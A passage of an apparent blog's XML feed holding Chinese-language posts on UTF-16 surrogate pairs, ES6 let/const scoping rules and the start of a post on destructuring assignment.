&lt;h3 id=&quot;UTF-16编码&quot;&gt;&lt;a href=&quot;#UTF-16编码&quot; class=&quot;headerlink&quot; title=&quot;UTF-16编码&quot;&gt;&lt;/a&gt;UTF-16编码&lt;/h3&gt;&lt;p&gt;在Unicode中的字符非常多，但是我们大多数人使用最平凡的则是0~65535以内的字符，也就是基本平面(BMP)只需要2两个字节就可以完全表示。于是就有了UTF-16编码，这是一种在字符存储空间和字符查找效率上综合的编码方式。&lt;br&gt;由于在基本平面内(BMP),从U+D800~U+DFFF是没有对应字符的(具体原因还有待解答)，那么在辅助平面上(SMP)，总共有16个平面。每个平面有2&lt;sup&gt;16&lt;/sup&gt;个字符编码，那么总共是2&lt;sup&gt;20&lt;/sup&gt;个编码。UTF-16将这20位拆成两半，前10位映射在U+D800到U+DBFF，称为&lt;strong&gt;高位（H）&lt;/strong&gt; ，后10位映射在U+DC00到U+DFFF，称为&lt;strong&gt;低位（L）&lt;/strong&gt; 。这意味着，一个辅助平面的字符，被拆成两个基本平面的字符表示。那么我们在高位的范围中发现了一个字符编码，于是我们用UTF-16的&lt;strong&gt;对应规则&lt;/strong&gt;去低位寻找另外一个字符编码，这样，我们就组成了一个在辅助平面上的字符编码。&lt;br&gt;上面提到的对应规则具体为：&lt;br&gt;&lt;figure class=&quot;highlight ini&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;H&lt;/span&gt; = Math.floor((c-&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;x10000) / &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;x400)+&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;xD800&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;L&lt;/span&gt; = (c - &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;x10000) % &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;x400 + &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;xDC00&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;结语&quot;&gt;&lt;a href=&quot;#结语&quot; class=&quot;headerlink&quot; title=&quot;结语&quot;&gt;&lt;/a&gt;结语&lt;/h2&gt;&lt;p&gt;这篇文章是根据阮大神的&lt;a href=&quot;http://www.ruanyifeng.com/blog/2014/12/unicode.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Unicode与JavaScript详解&lt;/a&gt;和吴秦的&lt;a href=&quot;http://www.cnblogs.com/skynet/archive/2011/05/03/2035105.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;字符集和字符编码&lt;/a&gt;的一些讲解加上自己的一些思考写出来的，但是这些毕竟不是官方文档的解释，所以肯定会有些错误，在日后的自己学习当中，会补充和修改。&lt;br&gt;总的来说，我在字符集相关方面的知识还是比较浅，还是需要在日后的一些实践中多多总结，它们的文中的有些点的讲解还是需要好好琢磨一下。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;曾近有段时间在学php的时候，总是会碰到往数据库中插入数据乱码问题。前几天JSP老师在课上演示往SQLServer中插入数据，结果也是乱码一大堆了，调试了很久才正常。”字符乱码问题会伴随你们的程序人生”，他说这是这节课最重要的知识点。所以，身为一名未来的程序员，必要的字符编码知识是我们所必须掌握的。&lt;br&gt;
    
    </summary>
    
    
      <category term="Javascript" scheme="http://summerGreenTea.github.io/tags/Javascript/"/>
    
      <category term="Unicode" scheme="http://summerGreenTea.github.io/tags/Unicode/"/>
    
  </entry>
  
  <entry>
    <title>ESMAScript6系列之let-const命令</title>
    <link href="http://summerGreenTea.github.io/2015/12/07/es6-let-const/"/>
    <id>http://summerGreenTea.github.io/2015/12/07/es6-let-const/</id>
    <published>2015-12-07T13:55:12.000Z</published>
    <updated>2016-03-02T02:58:00.274Z</updated>
    
    <content type="html">&lt;p&gt;&lt;code&gt;ECMAScript6&lt;/code&gt;在2015年6月份正式定稿，这也就预示着以ECMAScript为语言的核心的javascript进入了一个新的系列。这个系列的文章就记录了我学习的&lt;code&gt;ECMAScript6&lt;/code&gt;的一些笔记和总结。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;let-const命令&quot;&gt;&lt;a href=&quot;#let-const命令&quot; class=&quot;headerlink&quot; title=&quot;let-const命令&quot;&gt;&lt;/a&gt;let-const命令&lt;/h2&gt;&lt;h3 id=&quot;不存在变脸作用域提升&quot;&gt;&lt;a href=&quot;#不存在变脸作用域提升&quot; class=&quot;headerlink&quot; title=&quot;不存在变脸作用域提升&quot;&gt;&lt;/a&gt;不存在变脸作用域提升&lt;/h3&gt;&lt;figure class=&quot;highlight vala&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;## part 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;console.log(a);   &lt;span class=&quot;comment&quot;&gt;//undefined  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; a = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;## part 2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;console.log(a); &lt;span class=&quot;comment&quot;&gt;//ReferenceError&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;let a = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;## part 3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;console.log(a);  &lt;span class=&quot;comment&quot;&gt;//ReferenceError&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; a = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;暂时性死区&quot;&gt;&lt;a href=&quot;#暂时性死区&quot; class=&quot;headerlink&quot; title=&quot;暂时性死区&quot;&gt;&lt;/a&gt;暂时性死区&lt;/h3&gt;&lt;p&gt;在ECMAScript6中规定，一旦在代码区块中有变量的声明，那么在变量声明语句之前使用该变量就会报错。&lt;br&gt;对于在代码块中用&lt;code&gt;let&lt;/code&gt;和&lt;code&gt;const&lt;/code&gt;声明的变量来说，改代码块就相当形成了一个&lt;code&gt;封闭作用域&lt;/code&gt;，凡是在声明命令之前使用这些变量，都是不合法的。这种情况在语法上叫做&lt;strong&gt;暂时性死区&lt;/strong&gt;。&lt;br&gt;&lt;figure class=&quot;highlight xl&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;name&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;淡夏的绿茶&quot;&lt;/span&gt;;   &lt;span class=&quot;comment&quot;&gt;//ReferenceError&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    let &lt;span class=&quot;keyword&quot;&gt;name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;不允许重复声明&quot;&gt;&lt;a href=&quot;#不允许重复声明&quot; class=&quot;headerlink&quot; title=&quot;不允许重复声明&quot;&gt;&lt;/a&gt;不允许重复声明&lt;/h3&gt;&lt;p&gt;这个是指我们在一个块级作用域内(注意：在ECMAScript6中，使用&lt;code&gt;let&lt;/code&gt;和&lt;code&gt;const&lt;/code&gt;声明的变量会在该代码块中形成块级作用域)用&lt;code&gt;let&lt;/code&gt;、&lt;code&gt;const&lt;/code&gt;和&lt;code&gt;var&lt;/code&gt;声明变量的时候，不能重复使用&lt;code&gt;let&lt;/code&gt;和&lt;code&gt;const&lt;/code&gt;声明。&lt;br&gt;&lt;figure class=&quot;highlight cs&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; name = &lt;span class=&quot;string&quot;&gt;&quot;淡夏的绿茶&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; name = &lt;span class=&quot;string&quot;&gt;&quot;淡夏的绿茶&quot;&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;// ReferenceError&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;printName&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;name&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; name = &lt;span class=&quot;string&quot;&gt;&quot;淡夏的绿茶&quot;&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;// ReferenceError&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; name;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;块级作用域&quot;&gt;&lt;a href=&quot;#块级作用域&quot; class=&quot;headerlink&quot; title=&quot;块级作用域&quot;&gt;&lt;/a&gt;块级作用域&lt;/h3&gt;&lt;p&gt;在前面我们也提到了ECMAScript6中块级作用域的一些概念。举几个例子吧：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// example 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;summer&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; name = &lt;span class=&quot;string&quot;&gt;&quot;summer&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; name;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; age = &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(name); &lt;span class=&quot;comment&quot;&gt;// ReferenceError&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(age);  &lt;span class=&quot;comment&quot;&gt;// 20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight xl&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// example 2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    let &lt;span class=&quot;keyword&quot;&gt;name&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;summer&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;console.&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;name&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;// ReferenceError&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一个例子是说在之前版本中，只存在全局作用域和函数作用域了，所以在出函数中定义的变量都会被绑定在window这个全局对象上，这个会污染全局的命名空间，特别在我们引入大量第三方库的时候。第二个例子是说，我们在if后面的代码块中用let声明了一个变量name，那么name只能在if后面的代码块中被访问。&lt;br&gt;在ECMAscript6中，给&lt;code&gt;let&lt;/code&gt;和&lt;code&gt;const&lt;/code&gt;声明的变量所在代码块形成一个块级作用域，这些变量只能在这个块级作用域中被访问。这个块级作用域只是针对let 和 const声明的变量，对var声明的变量，还是只支持全局作用域和函数作用域。&lt;/p&gt;
&lt;h3 id=&quot;const常量&quot;&gt;&lt;a href=&quot;#const常量&quot; class=&quot;headerlink&quot; title=&quot;const常量&quot;&gt;&lt;/a&gt;const常量&lt;/h3&gt;&lt;p&gt;&lt;code&gt;const&lt;/code&gt;用来声明常量，这个就表示const声明的变量是不能被修改的，而且const变量一旦生命就必须初始化。&lt;br&gt;当const变量指向一个对象的时候，这个变量保存的是这个对象的内存空间的地址(学过C的同学应该不陌生),所以我们只要保证改地址不变的基础上，可以改变这个对象的内容(属性和方法)。&lt;br&gt;&lt;figure class=&quot;highlight processing&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;PI&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;3.14&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;literal&quot;&gt;PI&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;;  &lt;span class=&quot;comment&quot;&gt;// TypeError&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; arr = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;arr.push(&lt;span class=&quot;string&quot;&gt;&quot;summer&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;console.&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;(arr);  &lt;span class=&quot;comment&quot;&gt;// [&quot;summer&quot;]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;全局对象属性&quot;&gt;&lt;a href=&quot;#全局对象属性&quot; class=&quot;headerlink&quot; title=&quot;全局对象属性&quot;&gt;&lt;/a&gt;全局对象属性&lt;/h3&gt;&lt;p&gt;如果用&lt;code&gt;let&lt;/code&gt;和&lt;code&gt;const&lt;/code&gt;在全局作用域上声明变量，不会被添加到全局对象上。&lt;br&gt;&lt;figure class=&quot;highlight gauss&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// global.js&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; name = &lt;span class=&quot;string&quot;&gt;&quot;summer&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;console.&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.name); &lt;span class=&quot;comment&quot;&gt;//undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;ECMAScript6&lt;/code&gt;在2015年6月份正式定稿，这也就预示着以ECMAScript为语言的核心的javascript进入了一个新的系列。这个系列的文章就记录了我学习的&lt;code&gt;ECMAScript6&lt;/code&gt;的一些笔记和总结。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Javascript" scheme="http://summerGreenTea.github.io/tags/Javascript/"/>
    
      <category term="ESMAScript6" scheme="http://summerGreenTea.github.io/tags/ESMAScript6/"/>
    
  </entry>
  
  <entry>
    <title>学习ECMAScript6系列之结构表达式</title>
    <link href="http://summerGreenTea.github.io/2015/12/07/es6-destructuring-assignment/"/>
    <id>http://summerGreenTea.github.io/2015/12/07/es6-destructuring-assignment/</id>
    <published>2015-12-07T13:54:42.000Z</published>
    <updated>2016-03-02T02:58:00.274Z</updated>
    
    <content type="html">&lt;p&gt;&lt;strong&gt;ECMAScript6解构表达式&lt;/strong&gt; 允许你使用类似数组或对象字面量的方式将数组和对象的属性赋值给变量。这种赋值语句非常简洁明了,我们可以用解构表达式来帮助我们书写更加“清晰”的代码。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;使用解构表达式是间非常简单的事情，我们只需要用类数组(解构类似数组，但其实是对应解构数组的一种解构)或类对象字面量的方式来将数组、对象字面量或迭代器(Iterator)的值赋值给解构解构中的变量，比如：&lt;br&gt;&lt;figure class=&quot;highlight xquery&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; [name, age, gender] = [&lt;span class=&quot;string&quot;&gt;&#39;summer&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;man&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; &amp;#123;name, age, gender&amp;#125; = &amp;#123;name: &lt;span class=&quot;string&quot;&gt;&#39;summer&#39;&lt;/span&gt;, age: &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;, gender: &lt;span class=&quot;string&quot;&gt;&#39;man&#39;&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;上面的代码就是使用解构表达式来对需要赋值的变量进行解构赋值。&lt;/p&gt;
&lt;h2 id=&quot;对数组的解构&quot;&gt;&lt;a href=&quot;#对数组的解构&quot; class=&quot;headerlink&quot; title=&quot;对数组的解构&quot;&gt;&lt;/a&gt;对数组的解构&lt;/h2&gt;&lt;p&gt;这种方式应用在嵌套较深的数组的时候显得非常游刃有余。&lt;br&gt;&lt;figure class=&quot;highlight markdown&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;let [a, [b, [c, d]]] = [1, [2, [3, 4]]];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;// 相当于&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;const arr = [1, [2, [3, 4]]];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;let a = arr[&lt;span class=&quot;string&quot;&gt;0&lt;/span&gt;], b = arr[&lt;span class=&quot;string&quot;&gt;1&lt;/span&gt;][&lt;span class=&quot;symbol&quot;&gt;0&lt;/span&gt;], c = arr[&lt;span class=&quot;string&quot;&gt;1&lt;/span&gt;][&lt;span class=&quot;symbol&quot;&gt;1&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;0&lt;/span&gt;], d = arr[&lt;span class=&quot;string&quot;&gt;1&lt;/span&gt;][&lt;span class=&quot;symbol&quot;&gt;1&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
